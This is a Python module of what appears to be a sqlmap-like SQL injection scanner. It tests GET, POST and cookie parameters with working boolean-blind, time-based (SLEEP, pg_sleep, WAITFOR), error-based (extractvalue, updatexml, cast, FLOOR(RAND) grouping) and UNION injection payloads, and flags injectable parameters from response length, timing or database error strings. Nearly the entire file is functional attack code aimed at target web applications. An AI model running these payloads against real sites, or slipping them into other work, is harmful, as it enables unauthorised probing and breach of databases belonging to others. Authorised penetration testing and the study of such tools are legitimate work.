import time
import re
import logging
from lib.request.client import Request

logger = logging.getLogger(__name__)

class InjectionDetector:
    def __init__(self, settings, session):
        self.settings = settings
        self.session = session
        self.request = Request(session, settings)
        
    def detect_all(self):
        """Detect all injection points in GET/POST/Cookie/Headers"""
        vulnerabilities = []
        
        # GET parameters
        for param, value in self.settings.get_params.items():
            vuln = self.test_parameter(param, value, "GET")
            if vuln:
                vulnerabilities.append(vuln)
                
        # POST parameters
        if self.settings.data:
            for param, value in self.settings.post_params.items():
                vuln = self.test_parameter(param, value, "POST")
                if vuln:
                    vulnerabilities.append(vuln)
                    
        # Cookie parameters
        if self.settings.cookie:
            for param, value in self.settings.cookie_params.items():
                vuln = self.test_parameter(param, value, "COOKIE")
                if vuln:
                    vulnerabilities.append(vuln)
                    
        return vulnerabilities
        
    def test_parameter(self, param, original_value, location):
        """Test a single parameter for SQL injection"""
        logger.debug(f"Testing {location} parameter: {param}")
        
        # Boolean blind test
        if self.test_boolean(param, original_value, location):
            return {
                "param": param,
                "location": location,
                "technique": "boolean",
                "original_value": original_value
            }
            
        # Time-based test
        if self.test_time(param, original_value, location):
            return {
                "param": param,
                "location": location,
                "technique": "time",
                "original_value": original_value
            }
            
        # Error-based test
        if self.test_error(param, original_value, location):
            return {
                "param": param,
                "location": location,
                "technique": "error",
                "original_value": original_value
            }
            
        # Union-based test
        if self.test_union(param, original_value, location):
            return {
                "param": param,
                "location": location,
                "technique": "union",
                "original_value": original_value
            }
            
        return None
        
    def test_boolean(self, param, original_value, location):
        """Test boolean-based blind injection"""
        payload_true = f"{original_value}' AND '1'='1"
        payload_false = f"{original_value}' AND '1'='2"
        
        resp_true = self.request.send(param, payload_true, location)
        resp_false = self.request.send(param, payload_false, location)
        
        if resp_true and resp_false:
            # Check if responses differ significantly
            if len(resp_true.text) != len(resp_false.text):
                return True
            # Check for content difference (simple heuristic)
            if resp_true.text != resp_false.text:
                return True
        return False
        
    def test_time(self, param, original_value, location):
        """Test time-based blind injection"""
        # Use sleep based on DBMS detection (try multiple)
        time_payloads = [
            f"{original_value}' AND SLEEP(5)-- -",
            f"{original_value}' AND pg_sleep(5)-- -",
            f"{original_value}'; WAITFOR DELAY '0:0:5'-- -"
        ]
        
        for payload in time_payloads:
            start = time.time()
            self.request.send(param, payload, location)
            elapsed = time.time() - start
            if elapsed > 4:  # More than 4 seconds
                return True
        return False
        
    def test_error(self, param, original_value, location):
        """Test error-based injection"""
        error_payloads = [
            f"{original_value}' AND extractvalue(1,concat(0x7e,version()))-- -",
            f"{original_value}' AND updatexml(1,concat(0x7e,version()),1)-- -",
            f"{original_value}' AND 1=cast((select version()) as int)-- -",
            f"{original_value}' AND (SELECT * FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)-- -"
        ]
        for payload in error_payloads:
            resp = self.request.send(param, payload, location)
            if resp and re.search(r'XPATH|syntax error|MySQL|PostgreSQL|ODBC|SQLite|ORA-', resp.text, re.I):
                return True
        return False
        
    def test_union(self, param, original_value, location):
        """Test union-based injection"""
        # Simple test for UNION
        payload = f"{original_value}' UNION SELECT NULL-- -"
        resp = self.request.send(param, payload, location)
        if resp:
            # If error about different number of columns, it's a good sign (we can later adjust)
            if 'The used SELECT statements have a different number of columns' in resp.text:
                # Still vulnerable, we just need to detect column count
                return True
            # If no error and we see our injected NULL or UNION, it's vulnerable
            if 'UNION' in resp.text or 'NULL' in resp.text:
                return True
        return False